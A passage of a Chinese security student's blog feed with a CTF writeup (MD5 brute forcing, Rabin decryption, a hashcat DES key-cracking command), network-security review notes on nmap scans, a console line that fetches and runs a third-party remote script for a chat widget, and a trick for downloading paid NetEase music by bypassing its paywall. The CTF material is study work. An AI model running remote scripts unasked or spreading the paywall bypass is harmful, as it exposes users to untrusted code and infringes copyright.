title="爆破脚本"></a>爆破脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">num=[0,1,2,3,4,5,6,7,8,9]</span><br><span class="line">for i in num[1:]:</span><br><span class="line">    for j in num:</span><br><span class="line">        for k in num:</span><br><span class="line">            for l in num:</span><br><span class="line">                s=[0]*4</span><br><span class="line">                v=[]*4</span><br><span class="line">                a=chr(i+48)+chr(j+48)+chr(k+48)+chr(l+48)</span><br><span class="line">                Md5 = hashlib.md5(a)</span><br><span class="line">                md5=Md5.hexdigest().decode(&apos;hex&apos;)</span><br><span class="line">                v.append((ord(md5[0])&amp;0x0f)+48)</span><br><span class="line">                v.append((ord(md5[0]) &gt;&gt; 4) + 48)</span><br><span class="line">                v.append((ord(md5[1]) &amp; 0xF) + 48)</span><br><span class="line">                v.append((ord(md5[1]) &gt;&gt; 4) + 48)</span><br><span class="line">                #print v</span><br><span class="line">                for p in range(0,4):</span><br><span class="line">                    for q in range(0,4):</span><br><span class="line">                        if s[q]==0 and v[q] == ord(a[p]):</span><br><span class="line">                            s[q]=1</span><br><span class="line">                            break</span><br><span class="line">                flag=0</span><br><span class="line">                for kk in range(0,4):</span><br><span class="line">                    if s[kk]==0:</span><br><span class="line">                        flag=1</span><br><span class="line">                        break</span><br><span class="line">                if(flag==0):</span><br><span class="line">                    print a</span><br></pre></td></tr></table></figure><p>得到正确的输入<br><img src="/2018/12/16/cumt-match/0x02-1.png" alt=""><br>输入得到flag<br><img src="/2018/12/16/cumt-match/333.png" alt=""></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="0x00-First-Level"><a href="#0x00-First-Level" class="headerlink" title="0x00 First Level"></a>0x00 First Level</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>文件里面有n 有e 也有c 所以一开始想到会不会是RSA<br><br>用yafu发现给的n能分解 </p><p><img src="/2018/12/16/cumt-match/0x03-1.png" alt=""></p><p>但发现一个问题 <code>e=2</code> RSA里要求<code>e</code>的取值需要和<code>φ(n)</code>互素 计算<code>φ(n)=(q-1)(p-1)</code>是<code>e=2</code>的倍数<br><br>所以不是RSA<br></p><p>在网上找到了Rabin密码 <br><br>是对RSA的一种改进 RSA基于指数同余<br>Rabin是基于二次同余Rabin中可以认为<code>e、d</code>是定值的RSA，<code>e=2,d=1/2</code><br>也就是说加密是<code>C=P^2（mod）N</code> 解密时<code>P=C^1/2（mod）N</code><br>Rabin密码系统中公钥是N 私钥是<code>tuple（p,q）</code><br>Rabin密码系统是不确定的 解密创建4个可能的明文</p><p>####解密脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">p= 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span><br><span class="line">q= 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span><br><span class="line">n = 803678453359654678294908849796070879683957150793334760331914564560436346246318146972037345532196144846302396231568208129578229658427016137015812294767829769526183110361155218973534132637868629878697276885010621667798340990722479232206539737134630022679611384856651457676742503181552612577723889148480371814427003519911887820259995809138224880985974019240787368063863785676352901706320933005866320209971047564687269855667449125006030388570791745025604012995932967808845626861494067477576269553063188942863345823904401993114875063039172398942273922006919297914636076165764724319820975790354316178447072264025710629612792744623493832043468536056092942850806682235592789516752472672702894552294332079944336742847297657777111820207270697743634301201554591025634597867621179900279341273373266922969077784989097180467385359637467960548625099446206714449802133881666168001526050626012123346093003692879254719481099405181507957042513412777445437991143507101426673368439550927862534716776799293748523014679560356204884432499174326668666155331266289275676407763431338435327338882392875844836751881757226026820173509270505776422652436206224746614491397668247316050974170122064912373180229234431227192655345960223082314479121823620163578746247313</span><br><span class="line">e = 2</span><br><span class="line">c = 499900287907163903863770127517451824950591449854220282014018552802396943304674724533357663876916175459043411887269615620980351359674373127551283923032759205525834407466303318140213222438375548066871397251493100247836770129792554768759516349058673615081761638343932256849889604058608747531941928982832585706361391950223948529046950139043176720742038526998231448270490097134641169635210567151369533018545746204046992368621334939029582400285322777365958482219075297507215203709356125635202625121091161318566582307478931230962853531285514124459092351456397307588024613094226807792165876133269038363995037219677926220967578191033480631890589761476293394613074763877465067481353073032261829035532832262390121385388328585967620567497069930361644409182632934629875953161754678971744082331335000439916510067572742641854184303838362027247026467270857712018679364014951870327424723286991989268813839644982317838329022551033151317911958707603833070206941532496854730739054206016872958750645705043270396511543390465607172543992216405734971188437702405334334961918445724163241075322921116618280425131683507843396376626705861243420399065472311770119489811395486846742327683616439776584876654620796349661745998246254486950516901889112077176621805823</span><br><span class="line"></span><br><span class="line">mp=pow(c,(p+1)/4,p)</span><br><span class="line">mq=pow(c,(q+1)/4,q)</span><br><span class="line">yp=gmpy2.invert(p,q)</span><br><span class="line">yq=gmpy2.invert(q,p)</span><br><span class="line">r=(yp*p*mq+yq*q*mp)%n</span><br><span class="line">rr=n-r</span><br><span class="line">s=(yp*p*mq-yq*q*mp)%n</span><br><span class="line">ss=n-s</span><br><span class="line">print hex(r)[2:].decode(&apos;hex&apos;)</span><br><span class="line">print hex(rr)[2:].decode(&apos;hex&apos;)</span><br><span class="line">print hex(s)[2:].decode(&apos;hex&apos;)</span><br><span class="line">print hex(ss)[2:].decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure><p>其中一个就是需要的明文<br><img src="/2018/12/16/cumt-match/0x03-2.png" alt=""></p><h3 id="0x01-Second-Level"><a href="#0x01-Second-Level" class="headerlink" title="0x01 Second Level"></a>0x01 Second Level</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>给了一堆密文 提示是DES唯密文攻击</p><ol><li>发现有20组密文结尾都是<code>ea9c3c12181a1e82</code><img src="/2018/12/16/cumt-match/0x04-1.png" alt=""></li><li>相同结尾的密文长度都是16的倍数(这里只截了一部分密文的长度) 所以大概为8bytes一组<img src="/2018/12/16/cumt-match/0x04-2.png" alt=""></li><li>所以判断最后相同的数据是DES加密里的 padding 填充数据<code>0808080808080808</code></li><li>得到一组明文密文对 <code>ea9c3c12181a1e82:0808080808080808</code></li></ol><h4 id="爆破key"><a href="#爆破key" class="headerlink" title="爆破key"></a>爆破key</h4><ol><li>DES加密算法有固定长度8bytes的key</li><li>所以可以爆破八位的key</li><li>使用<code>hashcat</code>工具进行爆破</li></ol><p>安装<code>hashcat</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">brew search hashcat</span><br><span class="line">brew install hashcat</span><br><span class="line">brew info hashcat</span><br></pre></td></tr></table></figure><p>全小写字母爆破失败了(差点以为凉了2333) 换了全大写字母 爆破成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 14000 ea9c3c12181a1e82:0808080808080808 -a 3 &apos;?u?u?u?u?u?u?u?u&apos; --force</span><br></pre></td></tr></table></figure><p>爆破key 的参数函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数字?d</span><br><span class="line">小写字母?l</span><br><span class="line">大写字母?u</span><br><span class="line">特殊字符?s</span><br><span class="line">大小写字母+特殊字符?a</span><br></pre></td></tr></table></figure><p><code>&#39;?u?u?u?u?u?u?u?u&#39;</code>key为表示8个大写字符<br><code>-m 14000</code> 表示是DES</p><p><img src="/2018/12/16/cumt-match/0x04-4.png" alt=""><br><code>-a 3</code>表示是爆破key</p><p><img src="/2018/12/16/cumt-match/0x04-3.png" alt=""></p><p>最后大概半小时不到 跑出 <code>key=&#39;JFRYOMPR&#39;</code></p><p><img src="/2018/12/16/cumt-match/0x04-5.png" alt=""></p><h4 id="DES解密"><a href="#DES解密" class="headerlink" title="DES解密"></a>DES解密</h4><p>感想队友提供的在线DES解密网站 提供了DES各种的工作模式对应的加密解密<br>把密文去掉换行 直接丢到里面去<a href="https://www.tools4noobs.com/online_tools/decrypt/" target="_blank" rel="noopener">https://www.tools4noobs.com/online_tools/decrypt/</a><br><img src="/2018/12/16/cumt-match/mmx22.png" alt=""><br>解密得到明文 好像是服务器的信息啥的 完全看不懂 在里面找到flag<br><img src="/2018/12/16/cumt-match/0x04-6.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#去了空行的密文:</span><br><span class="line">c=&aposapos;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      CUMTCTF‘2019第一次双月赛
    
    </summary>
    
      <category term="Writeup" scheme="http://bobosec.top/categories/Writeup/"/>
    
    
      <category term="各类WP" scheme="http://bobosec.top/tags/%E5%90%84%E7%B1%BBWP/"/>
    
  </entry>
  
  <entry>
    <title>网安复习</title>
    <link href="http://bobosec.top/2018/11/14/review/"/>
    <id>http://bobosec.top/2018/11/14/review/</id>
    <published>2018-11-14T06:27:19.000Z</published>
    <updated>2018-12-23T05:35:55.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次很认真的网安复习"><a href="#记一次很认真的网安复习" class="headerlink" title="记一次很认真的网安复习"></a>记一次很认真的网安复习</h1><h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><h3 id="网络安全面临的主要威胁：信息泄露，破坏信息，拒绝服务"><a href="#网络安全面临的主要威胁：信息泄露，破坏信息，拒绝服务" class="headerlink" title="网络安全面临的主要威胁：信息泄露，破坏信息，拒绝服务"></a>网络安全面临的主要威胁：信息泄露，破坏信息，拒绝服务</h3><h3 id="网络安全的基本属性：可用性，保密性，完整性"><a href="#网络安全的基本属性：可用性，保密性，完整性" class="headerlink" title="网络安全的基本属性：可用性，保密性，完整性"></a>网络安全的基本属性：可用性，保密性，完整性</h3><h3 id="OSI安全体系中的安全服务："><a href="#OSI安全体系中的安全服务：" class="headerlink" title="OSI安全体系中的安全服务："></a>OSI安全体系中的安全服务：</h3><h4 id="五类服务："><a href="#五类服务：" class="headerlink" title="五类服务："></a>五类服务：</h4><ol><li>认证服务</li><li>访问控制服务</li><li>机密性服务</li><li>不可否认服务</li><li>完整性服务</li></ol><h4 id="八种机制："><a href="#八种机制：" class="headerlink" title="八种机制："></a>八种机制：</h4><ol><li>加密</li><li>数字签名</li><li>访问控制</li><li>信息完整性</li><li>鉴别交换</li><li>业务量填充</li><li>路由控制</li><li>公证</li></ol><h2 id="黑客攻击流程"><a href="#黑客攻击流程" class="headerlink" title="黑客攻击流程"></a>黑客攻击流程</h2><ol><li>踩点（信息搜索，whios查询，dns查询，网络侦察）</li><li>扫描</li><li>查点</li><li>攻击实施阶段</li><li>攻击善后阶段</li><li>踩点-扫描-查点-获取访问权限-提权-窃取信息-掩踪灭迹-创建后门→拒绝服务</li></ol><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>一种通过模拟攻击者的技术与方法，挫败目标系统的安全控制措施并取得访问控制权的安全测试方法。、</p><h3 id="渗透测试的分类："><a href="#渗透测试的分类：" class="headerlink" title="渗透测试的分类："></a>渗透测试的分类：</h3><ol><li>白盒测试（知道一切信息）</li><li>黑盒测试（不知道一切信息）</li><li>灰盒测试（综合两种情况）</li></ol><h3 id="渗透测试的七个阶段："><a href="#渗透测试的七个阶段：" class="headerlink" title="渗透测试的七个阶段："></a>渗透测试的七个阶段：</h3><ol><li>前期交互阶段：和客户讨论确定测试的范围还有目标。</li><li>情报搜集阶段：利用各种方法搜集目标信息</li><li>威胁建模阶段：用搜集到的信息进行威胁建模，确定攻击方法，确定攻击切入点等。</li><li>漏洞分析阶段：综合信息找出实施渗透的攻击点。</li><li>渗透攻击阶段：开始入侵攻击目标。</li><li>后渗透攻击阶段：根据目标的信息，找到对目标测试系统由重要影响的攻击路径。</li><li>报告阶段：为客户书写渗透测试报告，体现获取到的信息及解决方案。</li></ol><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><h3 id="扫描的三个阶段："><a href="#扫描的三个阶段：" class="headerlink" title="扫描的三个阶段："></a>扫描的三个阶段：</h3><ol><li>确定目标系统是否存活，一般用ping扫描。</li><li>确定存活系统上运行的服务，一般用端口扫描技术。</li><li>探查目标系统运行的操作系统，一般用旗标抓取技术和协议指纹识别技术。</li></ol><h3 id="扫描的分类"><a href="#扫描的分类" class="headerlink" title="扫描的分类"></a>扫描的分类</h3><h4 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h4><ol><li>ping扫描<br>原理是发出特定类型的数据包，分析系统响应结果的过程。</li><li>nmap的 -sP命令</li></ol><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="TCP连接扫描"><a href="#TCP连接扫描" class="headerlink" title="TCP连接扫描"></a>TCP连接扫描</h5><ol><li>TCP连接扫描<br>原理是尝试与目标主机建立tcp连接（三握手），如果被扫描端口开放，则建立连接成功。</li><li>nmap -sT命令</li></ol><h5 id="TCP-SYN扫描"><a href="#TCP-SYN扫描" class="headerlink" title="TCP SYN扫描"></a>TCP SYN扫描</h5><ol><li>半开扫描，完不成一次完整的TCP连接</li><li>nmap -sS命令</li></ol><h5 id="TCP-FIN扫描"><a href="#TCP-FIN扫描" class="headerlink" title="TCP FIN扫描"></a>TCP FIN扫描</h5><ol><li>原理是关闭的端口会丢弃数据包并用RST来回复FIN数据包。开放的端口只会简单的丢弃FIN数据包。</li><li>nmap -sF命令</li></ol><h5 id="TCP-ACK扫描"><a href="#TCP-ACK扫描" class="headerlink" title="TCP ACK扫描"></a>TCP ACK扫描</h5><p>nmap -sA</p><h5 id="TCP-窗口扫描"><a href="#TCP-窗口扫描" class="headerlink" title="TCP 窗口扫描"></a>TCP 窗口扫描</h5><p>nmap -sW</p><h5 id="TCP-Maimon扫描"><a href="#TCP-Maimon扫描" class="headerlink" title="TCP Maimon扫描"></a>TCP Maimon扫描</h5><p>nmap -sM</p><h5 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h5><p>nmap -sU</p><h2 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h2><ol><li>nmap </li><li>nessus</li><li>OpenVAS</li></ol><h2 id="网卡工作模式"><a href="#网卡工作模式" class="headerlink" title="网卡工作模式"></a>网卡工作模式</h2><ol><li>广播模式</li><li>组播模式</li><li>单播模式</li><li>混杂模式</li></ol><h2 id="交换式局域网嗅探技术"><a href="#交换式局域网嗅探技术" class="headerlink" title="交换式局域网嗅探技术"></a>交换式局域网嗅探技术</h2>]]></content>
    
    <summary type="html">
    
      review
    
    </summary>
    
      <category term="复习" scheme="http://bobosec.top/categories/%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="网安" scheme="http://bobosec.top/tags/%E7%BD%91%E5%AE%89/"/>
    
  </entry>
  
  <entry>
    <title>在自己博客创建在线聊天室</title>
    <link href="http://bobosec.top/2018/11/11/chat-room/"/>
    <id>http://bobosec.top/2018/11/11/chat-room/</id>
    <published>2018-11-11T06:49:50.000Z</published>
    <updated>2018-11-11T06:54:33.241Z</updated>
    
    <content type="html"><![CDATA[<p>效果可以看下图：<br><img src="/2018/11/11/chat-room/chat.jpg" alt=" "><br>直接在控制台执行以下代码即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var s=document.createElement(&apos;script&apos;); s.src=&apos;https://topurl.cn/chat.js&apos;; document.body.append(s);</span><br></pre></td></tr></table></figure><br>这样就可以在网页上和正在浏览这个网页的人说话了，手动感谢Ivan大佬给的代码。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;效果可以看下图：&lt;br&gt;&lt;img src=&quot;/2018/11/11/chat-room/chat.jpg&quot; alt=&quot; &quot;&gt;&lt;br&gt;直接在控制台执行以下代码即可&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
      <category term="hexo小技巧" scheme="http://bobosec.top/categories/hexo%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="实用技巧" scheme="http://bobosec.top/tags/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>Hexo NEXT主题添加点击爱心效果</title>
    <link href="http://bobosec.top/2018/11/10/click-love/"/>
    <id>http://bobosec.top/2018/11/10/click-love/</id>
    <published>2018-11-09T16:02:19.000Z</published>
    <updated>2018-11-09T16:09:27.255Z</updated>
    
    <content type="html"><![CDATA[<p>今天晚上无聊一直在收拾自己的博客，因为前面自己的博客实在太丑了hhh</p><h1 id="Hexo-NEXT主题添加点击爱心效果"><a href="#Hexo-NEXT主题添加点击爱心效果" class="headerlink" title="Hexo NEXT主题添加点击爱心效果"></a>Hexo NEXT主题添加点击爱心效果</h1><h2 id="创建js文件"><a href="#创建js文件" class="headerlink" title="创建js文件"></a>创建js文件</h2><p>在<code>/themes/next/source/js/src</code>下新建文件<code>clicklove.js</code>，接着把该链接下的代码拷贝粘贴到<code>clicklove.js</code>文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!function(e,t,a)&#123;function n()&#123;c(&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &apos;&apos;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;),o(),r()&#125;function r()&#123;for(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=&quot;left:&quot;+d[e].x+&quot;px;top:&quot;+d[e].y+&quot;px;opacity:&quot;+d[e].alpha+&quot;;transform:scale(&quot;+d[e].scale+&quot;,&quot;+d[e].scale+&quot;) rotate(45deg);background:&quot;+d[e].color+&quot;;z-index:99999&quot;);requestAnimationFrame(r)&#125;function o()&#123;var t=&quot;function&quot;==typeof e.onclick&amp;&amp;e.onclick;e.onclick=function(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;function i(e)&#123;var a=t.createElement(&quot;div&quot;);a.className=&quot;heart&quot;,d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;function c(e)&#123;var a=t.createElement(&quot;style&quot;);a.type=&quot;text/css&quot;;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)&#125;function s()&#123;return&quot;rgb(&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;)&quot;&#125;var d=[];e.requestAnimationFrame=function()&#123;return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);</span><br></pre></td></tr></table></figure><br>代码有点长，因为网上好多教程是让点击一个网站拿源码再复制到js，结果那个网站已经打不开了</p><h2 id="修改-layout-swig"><a href="#修改-layout-swig" class="headerlink" title="修改_layout.swig"></a>修改_layout.swig</h2><p>在<code>\themes\next\layout\_layout.swig</code>文件末尾添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 页面点击小红心 --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clicklove.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>这样就好啦~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天晚上无聊一直在收拾自己的博客，因为前面自己的博客实在太丑了hhh&lt;/p&gt;
&lt;h1 id=&quot;Hexo-NEXT主题添加点击爱心效果&quot;&gt;&lt;a href=&quot;#Hexo-NEXT主题添加点击爱心效果&quot; class=&quot;headerlink&quot; title=&quot;Hexo NEXT主题添
      
    
    </summary>
    
      <category term="Hexo小技巧" scheme="http://bobosec.top/categories/Hexo%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="实用技巧" scheme="http://bobosec.top/tags/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>怎样不用任何插件下载网易云收费音乐</title>
    <link href="http://bobosec.top/2018/11/05/music/"/>
    <id>http://bobosec.top/2018/11/05/music/</id>
    <published>2018-11-05T09:54:47.000Z</published>
    <updated>2018-11-05T10:22:52.869Z</updated>
    
    <content type="html"><![CDATA[<p>今天突然有人问我IT男会不会免费下载网易云收费音乐，我说试试吧<br>于是在来回琢磨种发现了这个小技巧，不需要任何插件就可以，很简单<br>首先我们打开网易云音乐官网，选一首下载需要收费的歌曲，如图<br>我们下载一个最近很火的《沙漠骆驼》，在客户端上可以看到是收费的。<br><img src="/2018/11/05/music/1.jpg" alt=" "><br>我们打开网易云官网搜索《沙漠骆驼》<br><img src="/2018/11/05/music/2.jpg" alt=" "><br>记住后面的歌曲ID<br>这时我们需用到歌曲解析接口<a href="http://music.163.com/song/media/outer/url?id=().mp3" target="_blank" rel="noopener">http://music.163.com/song/media/outer/url?id=().mp3</a><br>括号里面写你想下载的歌曲的ID<br><img src="/2018/11/05/music/3.jpg" alt=" "><br>来到了这个页面，这说明我们的链接解析成功<br>直接鼠标右键下载即可<br><img src="/2018/11/05/music/4.jpg" alt=" "><br>下载到桌面，但是名字是乱码，自己重命名一下即可<br><img src="/2018/11/05/music/5.jpg" alt=" "><br>下载成功，收费歌曲已经被我们不用安装任何插件下载下来了，美滋滋</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天突然有人问我IT男会不会免费下载网易云收费音乐，我说试试吧&lt;br&gt;于是在来回琢磨种发现了这个小技巧，不需要任何插件就可以，很简单&lt;br&gt;首先我们打开网易云音乐官网，选一首下载需要收费的歌曲，如图&lt;br&gt;我们下载一个最近很火的《沙漠骆驼》，在客户端上可以看到是收费的。&lt;b
      
    
    </summary>
    
    
      <category term="实用技巧" scheme="http://bobosec.top/tags/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap命令</title>
    <link href="http://bobosec.top/2018/11/03/sqlmap/"/>
    <id>http://bobosec.top/2018/11/03/sqlmap/</id>
    <published>2018-11-03T15:25:10.000Z</published>
    <updated>2018-11-03T15:30:22.265Z</updated>
    
    <content type="html"><![CDATA[<p>马上要打一场个人赛，在这里码一次sqlmap常用命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span 